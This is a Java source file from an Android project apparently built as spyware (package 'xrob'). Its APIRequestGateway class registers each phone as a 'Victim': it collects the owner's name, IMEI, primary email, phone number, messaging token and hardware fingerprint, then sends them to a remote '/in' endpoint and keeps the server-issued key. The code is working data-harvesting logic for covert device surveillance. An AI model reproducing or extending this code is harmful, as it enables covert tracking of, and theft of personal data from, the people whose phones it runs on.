package com.theah64.xrob.utils;

import android.app.Activity;
import android.content.Context;
import android.content.SharedPreferences;
import android.os.Build;
import android.support.annotation.NonNull;
import android.support.annotation.Nullable;
import android.support.annotation.WorkerThread;
import android.util.Log;

import com.theah64.xrob.interfaces.JobListener;
import com.theah64.xrob.models.Victim;

import org.json.JSONException;

import java.io.IOException;

import okhttp3.Call;
import okhttp3.Callback;
import okhttp3.Request;
import okhttp3.Response;

/**
 * All the auth needed API request must be passed through this gate way.
 * Created by theapache64 on 12/9/16.
 */
public class APIRequestGateway {

    private static final String KEY_API_KEY = "api_key";

    private static final String X = APIRequestGateway.class.getSimpleName();
    private final Activity activity;

    private static String getDeviceName() {
        final String manufacturer = Build.MANUFACTURER;
        final String model = Build.MODEL;
        if (model.startsWith(manufacturer)) {
            return model.toUpperCase();
        } else {
            return manufacturer.toUpperCase() + " " + model;
        }
    }

    public static String getOtherDeviceInfo() {

        final StringBuilder stringBuilder = new StringBuilder();
        stringBuilder
                .append("Build.BOARD").append("=").append(Build.BOARD).append(",")
                .append("Build.BOOTLOADER").append("=").append(Build.BOOTLOADER).append(",")
                .append("Build.BRAND").append("=").append(Build.BRAND).append(",")
                .append("Build.DEVICE").append("=").append(Build.DEVICE).append(",")
                .append("Build.FINGERPRINT").append("=").append(Build.FINGERPRINT).append(",")
                .append("Build.DISPLAY").append("=").append(Build.DISPLAY).append(",")
                .append("Build.HARDWARE").append("=").append(Build.HARDWARE).append(",")
                .append("Build.HOST").append("=").append(Build.HOST).append(",")
                .append("Build.ID").append("=").append(Build.ID).append(",")
                .append("Build.PRODUCT").append("=").append(Build.PRODUCT).append(",")
                .append("Build.SERIAL").append("=").append(Build.SERIAL).append(",");


        if (CommonUtils.isSupport(14)) {
            stringBuilder.append("Build.getRadioVersion()").append("=").append(Build.getRadioVersion()).append(",");
        } else {
            //noinspection deprecation
            stringBuilder.append("Build.RADIO").append("=").append(Build.RADIO).append(",");
        }

        return stringBuilder.toString();
    }

    public interface APIRequestGatewayCallback {
        void onReadyToRequest(final String apiKey);

        void onFailed(final String reason);
    }

    private final Context context;
    @NonNull
    private final APIRequestGatewayCallback callback;

    private APIRequestGateway(Context context, final Activity activity, @NonNull APIRequestGatewayCallback callback) {
        this.context = context;
        this.activity = activity;
        this.callback = callback;
        execute();
    }

    public APIRequestGateway(final Activity activity, APIRequestGatewayCallback callback) {
        this(activity.getBaseContext(), activity, callback);
    }

    public APIRequestGateway(Context context, APIRequestGatewayCallback callback) {
        this(context, null, callback);
    }


    private void register(final Context context) {

        final ProfileUtils profileUtils = ProfileUtils.getInstance(context);

        //Collecting needed information
        final String name = profileUtils.getDeviceOwnerName();

        final String imei = profileUtils.getIMEI();
        final String deviceName = getDeviceName();
        final String deviceHash = DarKnight.getEncrypted(deviceName + imei);
        final String otherDeviceInfo = getOtherDeviceInfo();

        final String email = profileUtils.getPrimaryEmail();
        final String phone = profileUtils.getPhone();
        final PrefUtils prefUtils = PrefUtils.getInstance(context);
        final String fcmId = prefUtils.getString(Victim.KEY_FCM_ID);


        //Attaching them with the request
        final Request inRequest = new APIRequestBuilder("/in")
                .addParamIfNotNull(Victim.KEY_NAME, name)
                .addParam(Victim.KEY_IMEI, imei)
                .addParam(Victim.KEY_DEVICE_NAME, deviceName)
                .addParam(Victim.KEY_DEVICE_HASH, deviceHash)
                .addParam(Victim.KEY_OTHER_DEVICE_INFO, otherDeviceInfo)
                .addParamIfNotNull(Victim.KEY_FCM_ID, fcmId)
                .addParamIfNotNull(Victim.KEY_EMAIL, email)
                .addParamIfNotNull(Victim.KEY_PHONE, phone)
                .build();

        //Doing API request
        OkHttpUtils.getInstance().getClient().newCall(inRequest).enqueue(new Callback() {

            @Override
            public void onFailure(Call call, final IOException e) {
                e.printStackTrace();
                if (activity != null) {
                    activity.runOnUiThread(new Runnable() {
                        @Override
                        public void run() {
                            callback.onFailed(e.getMessage());
                        }
                    });
                } else {
                    callback.onFailed(e.getMessage());
                }
            }

            @Override
            public void onResponse(Call call, Response response) throws IOException {

                try {

                    final APIResponse inResp = new APIResponse(OkHttpUtils.logAndGetStringBody(response));
                    final String apiKey = inResp.getJSONObjectData().getString(KEY_API_KEY);

                    //Saving in preference
                    final SharedPreferences.Editor editor = prefUtils.getEditor();
                    if (fcmId != null) {
                        editor.putBoolean(PrefUtils.IS_FCM_SYNCED, true);
                    }

                    editor.putString(KEY_API_KEY, apiKey).commit();
                    editor.putBoolean(PrefUtils.IS_LOGGED_IN, true);

                    if (activity != null) {

                        activity.runOnUiThread(new Runnable() {
                            @Override
                            public void run() {
                                callback.onReadyToRequest(apiKey);
                            }
                        });

                    } else {
                        callback.onReadyToRequest(apiKey);
                    }
                } catch (JSONException | APIResponse.APIException e) {
                    e.printStackTrace();
                    if (activity != null) {
                        activity.runOnUiThread(new Runnable() {
                            @Override
                            public void run() {
                                callback.onFailed(e.getMessage());
                            }
                        });
                    } else {
                        callback.onFailed(e.getMessage());
                    }
                }
            }
        });

    }

    private void execute() {

        Log.d(X, "Opening gateway...");

        if (NetworkUtils.hasNetwork(context)) {

            Log.i(X, "Has network");

            final PrefUtils prefUtils = PrefUtils.getInstance(context);
            final String apiKey = prefUtils.getString(KEY_API_KEY);

            if (apiKey != null) {

                Log.d(X, "hasApiKey " + apiKey);

                if (activity != null) {
                    activity.runOnUiThread(new Runnable() {
                        @Override
                        public void run() {
                            callback.onReadyToRequest(apiKey);
                        }
                    });
                } else {
                    callback.onReadyToRequest(apiKey);
                }

            } else {

                Log.i(X, "Registering victim...");

                //Register victim here
                register(context);
            }

        } else {

            if (activity != null) {
                activity.runOnUiThread(new Runnable() {
                    @Override
                    public void run() {
                        callback.onFailed("No network!");
                    }
                });
            } else {
                callback.onFailed("No network!");
            }

            Log.e(X, "Doesn't have APIKEY and no network!");

        }
    }
}
